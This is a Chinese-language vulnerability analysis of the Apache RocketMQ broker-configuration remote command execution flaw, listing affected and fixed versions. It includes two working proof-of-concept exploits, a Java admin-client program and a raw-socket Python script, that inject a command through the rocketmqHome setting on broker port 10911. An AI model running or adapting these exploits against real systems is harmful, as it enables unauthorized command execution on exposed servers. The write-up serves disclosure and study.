# 漏洞简介

RocketMQ
5.1.0及以下版本，在一定条件下，存在远程命令执行风险。RocketMQ的NameServer、Broker、Controller等多个组件外网泄露，缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行命令。
此外，攻击者可以通过伪造 RocketMQ 协议内容来达到同样的效果。

影响版本

5.0.0 <= Apache RocketMQ < 5.1.1

4.0.0 <= Apache RocketMQ < 4.9.6

安全版本

Apache RocketMQ 5.1.1

Apache RocketMQ 4.9.6

## 漏洞复现

在本地创建 maven 项目 并添加依赖

    
    
    <dependencies>     
    <!-- https://mvnrepository.com/artifact/org.apache.rocketmq/rocketmq-tools -->  
    <dependency>  
    <groupId>org.apache.rocketmq</groupId>  
    <artifactId>rocketmq-tools</artifactId>  
    <version>5.1.0</version>  
    </dependency>  
    </dependencies>

编写漏洞利用代码

    
    
    import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;  
    ​  
    import java.util.Properties;  
    ​  
    public class poc1 {  
    public static void main(String[] args) throws Exception {  
    // 创建 Properties 对象  
    Properties props = new Properties();  
    //修改rocketmqHome配置  
    props.setProperty("rocketmqHome","-c gnome-calculator test");  
    props.setProperty("filterServerNums","1");  
    // 创建 DefaultMQAdminExt 对象并启动  
    DefaultMQAdminExt admin = new DefaultMQAdminExt();  
    //此处为 namesrv 端口,此端口无需可访问  
    admin.setNamesrvAddr("192.168.222.130:9876");  
    admin.start();  
    // 更新配置⽂件  
    //此处为 broker 端口，必须可访问  
    admin.updateBrokerConfig("192.168.222.130:10911", props);  
    // 关闭 DefaultMQAdminExt 对象  
    admin.shutdown();  
    }  
    }

## 漏洞分析

![image](https://image.3001.net/images/20230801/1690883307_64c8d4eb5a967bdee03e0.png!small)​

![image](https://image.3001.net/images/20230801/1690883308_64c8d4ec893b378a7aad0.png!small)  

![image](https://image.3001.net/images/20230801/1690883309_64c8d4ed6b2d58c70d1cb.png!small)​![image](https://image.3001.net/images/20230801/1690883310_64c8d4ee6e18ebf4b7c03.png!small)​

我们看到真正有危险的操作应该是与 10911 进行通信的操作，没有进行身份验证和加密传输，同时带入了命令执行的参数

`org/apache/rocketmq/remoting/protocol/RequestCode.java`​ code 代表调用不同的功能

![image](https://image.3001.net/images/20230801/1690883311_64c8d4ef71e1f403a0a53.png!small)`org/apache/rocketmq/broker/processor/AdminBrokerProcessor.java#processRequest`​

![image](https://image.3001.net/images/20230801/1690883312_64c8d4f0e953fed4a8986.png!small)​​`org/apache/rocketmq/broker/processor/AdminBrokerProcessor.java#updateBrokerConfig`​

![image](https://image.3001.net/images/20230801/1690883314_64c8d4f2a7fd6e05f3640.png!small)​​`org/apache/rocketmq/remoting/Configuration.java#update`​

![image](https://image.3001.net/images/20230801/1690883316_64c8d4f441f2356c46bf2.png!small)​如果属性名是其内置的，就进行更新操作

后面的一部分就比较清晰了

`org/apache/rocketmq/broker/BrokerStartup.java#start`​

![image](https://image.3001.net/images/20230801/1690883317_64c8d4f57ed3214a03d4c.png!small)​​`org/apache/rocketmq/broker/BrokerController.java#start`​

![image](https://image.3001.net/images/20230801/1690883318_64c8d4f6ab769b28046c9.png!small)​​`org/apache/rocketmq/broker/BrokerController.java#startBasicService`​

![image](https://image.3001.net/images/20230801/1690883319_64c8d4f7d4df8377d1fda.png!small)​​`org/apache/rocketmq/broker/filtersrv/FilterServerManager.java#start`​

![image](https://image.3001.net/images/20230801/1690883320_64c8d4f8cf3ac10ec4cea.png!small)

根据从 Wireshark 中抓取的数据包 我们也可以构造这样的 payload 触发漏洞

    
    
    import socket  
    import binascii  
    client = socket.socket()  
    ​  
    # you ip  
    client.connect(('192.168.222.130',10911))  
    ​  
    # data  
    json='{"code":25,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":433}'.encode('utf-8')  
    body='filterServerNums=1\nrocketmqHome=-c gnome-calculator test'.encode('utf-8')  
    json_lens = int(len(binascii.hexlify(json).decode('utf-8'))/2)               # 一个字节是2个十六进制数  
    head1 = '00000000'+str(hex(json_lens))[2:]                                   # hex(xxxx) 0x1243434 去掉 0x  
    all_lens = int(4+len(binascii.hexlify(body).decode('utf-8'))/2+json_lens)    # 总长度要 加上 head1[-8:] 的值  
    head2 = '00000000'+str(hex(all_lens))[2:]  
    data = head2[-8:]+head1[-8:]+binascii.hexlify(json).decode('utf-8')+binascii.hexlify(body).decode('utf-8') # 协议总长度+json长度+json+body  
    ​  
    # send  
    client.send(bytes.fromhex(data))  
    data_recv = client.recv(1024)  
    print(data_recv)

‍

## 漏洞修复

移除了命令执行的模块​

![image](https://image.3001.net/images/20230801/1690883321_64c8d4f9e83443333cce8.png!small)

  

